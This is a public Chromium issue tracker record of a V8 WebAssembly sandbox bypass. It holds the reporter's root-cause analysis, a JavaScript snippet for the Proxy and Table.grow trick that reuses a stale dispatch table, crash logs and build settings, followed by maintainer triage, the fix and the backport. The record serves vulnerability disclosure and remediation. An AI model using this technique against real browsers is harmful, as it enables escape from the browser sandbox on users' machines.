# V8 sandbox bypass: reuse `protected_uses` of `WasmDispatchTable` after grow

| Field | Value |
|-------|-------|
| **Issue ID** | [503422307](https://issues.chromium.org/issues/503422307) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>JavaScript>Sandbox, Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | pv...@gmail.com |
| **Assignee** | jk...@chromium.org |
| **Created** | 2026-04-17 |
| **Bounty** | $20,000.00 |

## Description

## Summary

- To resolve completely sandbox escape by abusing use after free of `WasmDispatchTable` this [commit](https://chromium-review.googlesource.com/c/v8/v8/+/7599741) introduce `Unpublish` method
- This remove the cleanup on old dispatch table and instead make the old dispatch table inaccessible from untrusted space

```

// remove these
old_table->set_protected_uses(
  *isolate->factory()->empty_protected_weak_fixed_array());
for (uint32_t i = 0; i < old_length; ++i) {
// Note: We pass `kNewEntry` here since the offheap data was already moved
// to the new table and we do not want to update anything there.
DispatchTableClear(*old_table, i, WasmDispatchTable::kNewEntry);
}

```

- But if somehow a trusted object still use that old dispatch table it can access and use those uncleared field

## Detail

- In the `InstanceBuilder::ProcessExports` there's some point that can trigger a callback using `exports_object`
- Here i swap `exports_object` with a `JSProxy` so that a callback will be called at `JSReceiver::SetIntegrityLevel`

```
void InstanceBuilder::ProcessExports() {
...

DirectHandle<WasmInstanceObject> instance_object{
  trusted_data_->instance_object(), isolate_};
DirectHandle<JSObject> exports_object =
  direct_handle(instance_object->exports_object(), isolate_); // swapped object
bool is_asm_js = is_asmjs_module(module_);

...
if (module_->origin == kWasmOrigin) {
    // trigger proxy handler here
    CHECK(JSReceiver::SetIntegrityLevel(isolate_, exports_object, FROZEN,
                                        kDontThrow)
              .FromMaybe(false));
  }

```

- The instantiation happens inside the `DisallowJavascriptExecution` scope which disallow js execution but it does not prevent api function

```
V8_WARN_UNUSED_RESULT MaybeHandle<Object> Invoke(Isolate* isolate,
                                                 const InvokeParams& params) {
...

// API function
if (IsJSFunction(*params.target)) {
    auto function = Cast<JSFunction>(params.target);
    if ((!params.is_construct || IsConstructor(*function)) &&
        function->shared()->IsApiFunction() &&
        !function->shared()->BreakAtEntry(isolate)) {
        ...
        
        auto value = Builtins::InvokeApiFunction(
          isolate, params.is_construct, fun_data, receiver, params.args,
          Cast<HeapObject>(params.new_target));
        ...
        
        return value;


....
    // the check is here
 // Entering JavaScript.
  VMState<JS> state(isolate);
  if (!AllowJavascriptExecution::IsAllowed(isolate)) {
    GRACEFUL_FATAL("Invoke in DisallowJavascriptExecutionScope");
  }
 ...

```

- In the exploit i use `Table.grow` to grow the dispatch table before run into `Build_Phase1_Infallible` that links the `WasmTrustedInstaceData` to `uses` so that the instantiated instance still have access to the old dispatch table
- The `JSProxy`

```
table.preventExtensions = WebAssembly.Table.prototype.grow; // will be called in table.preventExtensions, which will trigger the check in SetIntegrityLevel and cause the type confusion
// will be called in
/*
if (module_->origin == kWasmOrigin) {
    CHECK(JSReceiver::SetIntegrityLevel(isolate_, exports_object, FROZEN,
                                        kDontThrow)
              .FromMaybe(false));
  }
*/
// api function to avoid AllowJavascriptExecution check
let tableLengthGetter = Object.getOwnPropertyDescriptor(WebAssembly.Table.prototype, 'length').get;
let target = new WebAssembly.Table({ initial: 0x500, element: "anyfunc" }, null); // wasmTableObject to be valid for length getter
target[Symbol.toPrimitive] = tableLengthGetter; // api function to avoid AllowJavascriptExecution check
Object.preventExtensions(target); // prevent extension so that on ProxyPreventExtensions, it wont throw
let p = new Proxy(target, table);

```

- But this is actually unexploitable until this [commit](https://chromium-review.googlesource.com/c/v8/v8/+/7739142) which change `WasmTableGrow` to use dispatch table directly from the instance data

```
RUNTIME_FUNCTION(Runtime_WasmTableGrow) {
...

DirectHandle<WasmTableObject> table(
      Cast<WasmTableObject>(trusted_instance_data->tables()->get(table_index)),
      isolate);
  DirectHandle<WasmDispatchTable> dispatch_table( // resolved from trusted_instance_data
      trusted_instance_data->dispatch_table(table_index), isolate);
  int result =
      WasmTableObject::Grow(isolate, table, dispatch_table, delta, value);

  return Smi::FromInt(result);
}

```

- So we can use this to grow old dispatch table which will "shrink" table of another instance data lead to out of bound -> sandbox bypass. This reproduces [483220222](https://issues.chromium.org/issues/483220222)

## REPRODUCE

- Run `.\d8.exe --expose-memory-corruption-api poc.js`

## CRASH

```
(5dc0.1998): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
0000007c`613d1a59 48894207        mov     qword ptr [rdx+7],rax ds:00004141`41414141=????????????????

```
```
RAX: 00000000DEADBEEF   RBX: 00007FF639BF7480   RCX: 0000007C613D1A77   
RDX: 000041414141413A   RSI: 0000022E010844FD   RDI: 0000007C613D1A48   
RIP: 0000007C613D1A59   RSP: 00000068625FE6B0   RBP: 00000068625FE6D0   
R8:  7FFFFFFFFFFFFFFC   R9:  0000000000000000   R10: 0000000000000000   
R11: 0000000000000246   R12: 0000000000000000   R13: 00007BD400E68080   
R14: 0000023F00000000   R15: 00000068625FE698   
EFLAGS: 00010246 CF=0 PF=1 AF=0 ZF=1 SF=0 TF=0 IF=1 DF=0 OF=0
LastErrorValue: 0x00000000
LastStatusValue: 0x00000000

```
```
00 00000068`625fe6b0 0000007c`613c1ad7     0x0000007c`613d1a59
01 00000068`625fe6e0 00007ff6`3ab5bb09     0x0000007c`613c1ad7
02 00000068`625fe730 00007ff6`3ac48f1c     d8!Builtins_JSToWasmWrapperAsm+0x89
03 00000068`625fe768 00007ff6`9aad1512     d8!Builtins_JSToWasmWrapper+0xc5c
04 00000068`625fe960 00007ff6`3aaad9dc     0x00007ff6`9aad1512
05 00000068`625fea20 00007ff6`3aaad53f     d8!Builtins_JSEntryTrampoline+0x5c
06 00000068`625fea48 00007ff6`392e962c     d8!Builtins_JSEntry+0xff
07 (Inline Function) --------`--------     d8!v8::internal::GeneratedCode<unsigned long long,unsigned long long,unsigned long long,unsigned long long,unsigned long long,long long,unsigned long long **>::Call+0x13 [D:\10_4_2026\v8\src\execution\simulator.h @ 216] 
08 00000068`625feb70 00007ff6`392e9adb     d8!v8::internal::`anonymous namespace'::Invoke+0xf0c [D:\10_4_2026\v8\src\execution\execution.cc @ 474] 
09 00000068`625fed70 00007ff6`391337b3     d8!v8::internal::Execution::CallScript+0xdb [D:\10_4_2026\v8\src\execution\execution.cc @ 575] 
0a 00000068`625fee00 00007ff6`39097129     d8!v8::Script::Run+0x2b3 [D:\10_4_2026\v8\src\api\api.cc @ 2041] 
0b 00000068`625fef40 00007ff6`390b705e     d8!v8::Shell::ExecuteString+0x789 [D:\10_4_2026\v8\src\d8\d8.cc @ 1043] 
0c 00000068`625ff1d0 00007ff6`390bb7a0     d8!v8::SourceGroup::Execute+0x30e [D:\10_4_2026\v8\src\d8\d8.cc @ 5682] 
0d 00000068`625ff280 00007ff6`390bb3f9     d8!v8::Shell::RunMainIsolate+0x190 [D:\10_4_2026\v8\src\d8\d8.cc @ 6703] 
0e 00000068`625ff330 00007ff6`390bd691     d8!v8::Shell::RunMain+0x129 [D:\10_4_2026\v8\src\d8\d8.cc @ 6611] 
0f 00000068`625ff3c0 00007ff6`3acbccc8     d8!v8::Shell::Main+0x1491 [D:\10_4_2026\v8\src\d8\d8.cc @ 7534] 
10 (Inline Function) --------`--------     d8!invoke_main+0x22 [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
11 00000068`625ff920 00007ffd`5ab1e8d7     d8!__scrt_common_main_seh+0x10c [D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
12 00000068`625ff960 00007ffd`5c5cc48c     KERNEL32!BaseThreadInitThunk+0x17
13 00000068`625ff990 00000000`00000000     ntdll!RtlUserThreadStart+0x2c

```
## Credit

- Nao (@natsumikyouno\_\_)

## Attachments

- [grow_dispatch.js](attachments/grow_dispatch.js) (text/javascript, 7.8 KB)
- [poc.js](attachments/poc.js) (text/javascript, 8.0 KB)

## Timeline

### ch...@google.com (2026-04-17)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ti...@google.com (2026-04-17)

[Security shepherd] Report looks plausible, though I can't tell what the `(5dc0.1998): Access violation - code c0000005 (first chance)` crash means - seems to be Windows-specific.

Triaging as a v8 security bug, off to the current v8 security shepherd. Other fields are provisional.

### ml...@google.com (2026-04-17)

[Comment #3](https://issues.chromium.org/issues/503422307#comment3): Sandbox issues may crash. The question is whether this is inside or outside of the sandbox.

We should run this with `--run-as-sandbox-security-poc`

### ti...@google.com (2026-04-17)

Got it! Actually the current v8 shepherd is bikineev@, not emaxx@.

### em...@google.com (2026-04-17)

With `--run-as-sandbox-security-poc` (i.e., with the sandbox crash filters turned on), the outcome on Linux is:

```
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7a9a00000000,0x7b9a00000000)
Change property
1
Instantiate instance with grow dispatch
Found instance map, corrupting... b3000b0 -> 9784509 at b3001f8
Distance: 198
Shrink table
Caught harmless signal (SIGTRAP). Exiting process...

```

So the POC doesn't demonstrate a sandbox bypass.

### pv...@gmail.com (2026-04-17)

I think the problem is in the `--run-as-sandbox-security-poc` flag. I tried building and running on linux

It still pops up the sandbox violation message when i run with `--sandbox-testing` flag

```
nao@nao-virtual-machine:~/v8/v8/out/sbx$ ./d8 --sandbox-testing /home/nao/shared_directory/poc.js 
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x16fd00000000,0x17fd00000000)
Change property
1
Instantiate instance with grow dispatch
Found instance map, corrupting... 40000b0 -> b252c91 at 4000218
Distance: 1b8
Shrink table

## V8 sandbox violation detected!

Received signal 11 SEGV_MAPERR 414141414141

==== C stack trace ===============================

./d8(+0x1cdbec6)[0x5b394ab75ec6]
./d8(+0xd5d4a5)[0x5b3949bf74a5]
/lib/x86_64-linux-gnu/libc.so.6(+0x42520)[0x7c94d0042520]
[0x137ed19dda59]
[end of stack trace]
Segmentation fault (core dumped)
nao@nao-virtual-machine:~/v8/v8/out/sbx$ ./d8 --run-as-sandbox-security-poc /home/nao/shared_directory/poc.js 
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x34c900000000,0x35c900000000)
Change property
1
Instantiate instance with grow dispatch
Found instance map, corrupting... de800b0 -> 3f208b5 at de80218
Distance: 1b8
Shrink table
Caught harmless memory access violation (safe region). Exiting process...


```

### em...@google.com (2026-04-17)

You're right about `--run-as-sandbox-security-poc` - it looks like the POC changes its behavior to hitting `SIGTRAP` because of the following chain of implications: `run-as-sandbox-security-poc` ==> `run-as-security-poc` ==> `fuzzing` ==> `stress-lazy-source-positions`.

Having said that, I'm confused by the log from [comment #7](https://issues.chromium.org/issues/503422307#comment7): it first says `## V8 sandbox violation detected!` and then `Caught harmless memory access violation`. However the code is written like only one of these should happen: <https://source.chromium.org/chromium/chromium/src/+/main:v8/src/sandbox/testing.cc;l=999;drc=543d3485695369a9c4272191f6c8fa80d89e9ebe> . Can you confirm that's the log you're seeing locally? For me it still looks differently:

```
d8 --sandbox-testing repro-503422307.js
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
Sandbox bounds: [0x7a2000000000,0x7b2000000000)
Change property
1
Instantiate instance with grow dispatch
Found instance map, corrupting... 18c00b0 -> a9c5d01 at 18c0208
Distance: 1a8
Shrink table

## V8 sandbox violation detected!

The sandbox violation was a *read* access which is technically not a sandbox violation. This requires manual investigation.
Received signal 11 SEGV_ACCERR 7a0b00000003

==== C stack trace ===============================

out/clusterfuzz//d8(__interceptor_backtrace+0x46) [0x5652935729f6]
out/clusterfuzz//d8(_ZN2v84base5debug10StackTraceC1Ev+0x34) [0x565298f4ae84]
out/clusterfuzz//d8(+0x7ec8c70) [0x565298f4ac70]
out/clusterfuzz//d8(+0x417c9aa) [0x5652951fe9aa]
/usr/lib/x86_64-linux-gnu/libc.so.6(+0x40a70) [0x7f68f0a40a70]
out/clusterfuzz//d8(_ZN2v88internal23Runtime_WasmCompileLazyEiPmPNS0_7IsolateE+0x404) [0x565295da7614]
out/clusterfuzz//d8(+0x7cd8489) [0x565298d5a489]
[end of stack trace]
Segmentation fault         $B/d8 --sandbox-testing repro-503422307.js

```

### pv...@gmail.com (2026-04-17)

Oh the log above is when i run both `--run-as-sandbox-security-poc` and `--sandbox-testing`. The `Caught harmless memory access violation` message is poped up when i run it with `--run-as-sandbox-security-poc`

### em...@google.com (2026-04-20)

jkummerow@: Could you PTAL since you authored [crrev.com/c/7599741](https://crrev.com/c/7599741) and seem to have context on these issues? Thanks!

### em...@google.com (2026-04-20)

Also CC clemensb@ because of [crrev.com/c/7739142](https://crrev.com/c/7739142).

### jk...@chromium.org (2026-04-20)

All I can reproduce (with `--sandbox-testing`) is a read from an address ending in `...00000003`, like the output in #8. How do I get the write to `414141414141`? Do I need a particular revision and/or GN args?

### pv...@gmail.com (2026-04-21)

The PoC needs additional heap feng shui in the trusted space to succeed.
If the layout doesn’t line up, you usually only get the read from an address ending in ...00000003 instead of the
write to 0x414141414141.

Can you share your exact build environment so I can regenerate it on my side?

### pv...@gmail.com (2026-04-21)

This is my build environment and new poc

```
fetch v8
cd v8
gclient sync --with_branch_heads
gn gen out/sbx --args='is_debug=false
v8_enable_memory_corruption_api=true
v8_enable_object_print=true v8_enable_sandbox=true'
autoninja -C out/sbx d8


OS: Ubuntu 22.04.5 LTS (Jammy)
Built V8 commit: ffdfdbb844557fe04124077ed0c6de710089c018

```

### em...@google.com (2026-04-22)

I can confirm that the POC from [comment #14](https://issues.chromium.org/issues/503422307#comment14) triggers:

```
## V8 sandbox violation detected!

Received signal 11 SEGV_MAPERR 414141414141

==== C stack trace ===============================

out/clusterfuzz//d8(__interceptor_backtrace+0x46) [0x563acb21c9f6]
out/clusterfuzz//d8(_ZN2v84base5debug10StackTraceC1Ev+0x34) [0x563ad0c5ee84]
out/clusterfuzz//d8(+0x7f4bc70) [0x563ad0c5ec70]
out/clusterfuzz//d8(+0x418f42a) [0x563accea242a]
/usr/lib/x86_64-linux-gnu/libc.so.6(+0x40a70) [0x7ff65de40a70]
[0x7ff65e022a59]
[end of stack trace]

```

### cl...@appspot.gserviceaccount.com (2026-04-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5017123868934144.

### cl...@appspot.gserviceaccount.com (2026-04-22)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5901302747922432.

### 24...@project.gserviceaccount.com (2026-04-22)

Testcase 5901302747922432 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5901302747922432.

### jk...@chromium.org (2026-04-22)

Yes, the POC in #14 is good. Fix in flight: <https://chromium-review.googlesource.com/c/v8/v8/+/7785360>

Thanks for the report!

### dx...@google.com (2026-04-22)

Project: v8/v8  

Branch:  main  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7785360>

[sandbox][wasm] Fix WasmDispatchTable UAF

---


Expand for full commit details
```
     
    There was a sneaky way to turn concurrent in-sandbox mutation 
    into a stale WasmDispatchTable pointer. 
     
    Fixed: 503422307 
    Change-Id: I6182cc156799e48050a14b5f37f8acb00b67cacd 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7785360 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    Commit-Queue: Clemens Backes <clemensb@chromium.org> 
    Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106735}

```

---

Files:

- M `src/wasm/c-api.cc`
- M `src/wasm/module-instantiate.cc`
- M `src/wasm/wasm-js.cc`
- M `src/wasm/wasm-objects.cc`
- M `src/wasm/wasm-objects.tq`

---

Hash: [9c0c3018761681a8ea2e4c1bf26d6a04ec46f3b8](https://chromiumdash.appspot.com/commit/9c0c3018761681a8ea2e4c1bf26d6a04ec46f3b8)  

Date: Wed Apr 22 17:04:25 2026


---

### sa...@google.com (2026-04-24)

Thanks for the report and fix! I think it'd be worth back merging this fix as the bug allows for a sandbox breakout. I'll set the corresponding labels.

### ch...@google.com (2026-04-24)

**M148** merge request created. **Please update [crbug/506072024](https://crbug.com/506072024) to have this merge reviewed.**

### dx...@google.com (2026-04-27)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Jakob Kummerow [jkummerow@chromium.org](mailto:jkummerow@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7794881>

[M148] [sandbox][wasm] Fix WasmDispatchTable UAF

---


Expand for full commit details
```
     
    Original change's description: 
    > [sandbox][wasm] Fix WasmDispatchTable UAF 
    > 
    > There was a sneaky way to turn concurrent in-sandbox mutation 
    > into a stale WasmDispatchTable pointer. 
    > 
    > Fixed: 503422307 
    > Change-Id: I6182cc156799e48050a14b5f37f8acb00b67cacd 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7785360 
    > Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    > Auto-Submit: Jakob Kummerow <jkummerow@chromium.org> 
    > Commit-Queue: Clemens Backes <clemensb@chromium.org> 
    > Commit-Queue: Jakob Kummerow <jkummerow@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#106735} 
     
    (cherry picked from commit 9c0c3018761681a8ea2e4c1bf26d6a04ec46f3b8) 
     
    Bug: 506072024,503422307 
    Change-Id: I6182cc156799e48050a14b5f37f8acb00b67cacd 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7794881 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#20} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/wasm/c-api.cc`
- M `src/wasm/module-instantiate.cc`
- M `src/wasm/wasm-js.cc`
- M `src/wasm/wasm-objects.cc`
- M `src/wasm/wasm-objects.tq`

---

Hash: [43ffac72bad2ec5da273ecec9bc697ef64902b35](https://chromiumdash.appspot.com/commit/43ffac72bad2ec5da273ecec9bc697ef64902b35)  

Date: Wed Apr 22 17:04:25 2026


---

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $20000.00 for this report.

Rationale for this decision:
v8 Sandbox bypass


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### pe...@google.com (2026-07-31)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-07-31)

1. <https://chromium-review.git.corp.google.com/c/v8/v8/+/8162080>
2. Low - There were a couple of conflicts.
3. 148
4. Yes

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/503422307)*
